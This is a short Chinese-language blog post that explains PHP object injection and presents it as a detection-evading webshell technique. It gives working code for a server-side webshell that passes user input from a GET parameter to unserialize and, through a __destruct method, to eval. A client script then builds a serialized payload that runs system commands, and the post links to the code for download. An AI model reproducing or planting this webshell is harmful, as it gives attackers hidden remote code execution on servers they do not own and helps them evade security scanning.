---
layout:     post
title:      unserialize免杀webshell
date:       2017-04-18
summary:    unserialize免杀webshell
categories: web
tags:
 - unserialize
 - php
 - webshell
---

### php的unserialize函数

```
php的unserialize反序列化函数可以将反序列化后的结果还原成数字,字符,数组,对象等类型,如果还原后的结果是对象且这个
对象对应的类有__wakeup,__destruct等函数,那么在unserialize函数执行后将执行对应的函数(__wakeup,__destruct等)

refer:
http://www.91ri.org/3960.html
https://www.owasp.org/index.php/PHP_Object_Injection
```

### 利用unserialize构造webshell

#### 服务端[webshell]

```
<?php

class foo{
    public $data="text";
    function __destruct()
    {
        eval($this->data);
    }

}

$file_name=$_GET['id'];
unserialize($file_name);
```

#### 客户端[相当于菜刀]

```
<?php

class foo{
    #public $data="phpinfo();";
    public $data="system('ls');";

}
$a=new foo;
$b=serialize($a);
echo "please visit uri:\n"."[your shell page url]"."?id=".$b;
```

#### 理解

```
服务端被访问后在内存中有一个foo类模板,当客户端伪造一个同名的叫做foo的类的对象的序列化后的结果给服务端反序列化时
,服务端在反序列化这个这个传入的反序列化值后将认为这是当前内存中对应的foo类模板的一个实例对象,于是去执行当前内存
的foo类模板的__wakeup,__destruct等函数,但是恰好这些函数会造成php代码执行[eval($this->data)],且$this->data可控.
```

本文代码对应下载链接如下<br>
<a href="https://github.com/3xp10it/xwebshell/tree/master/unserializePHP">download</a>

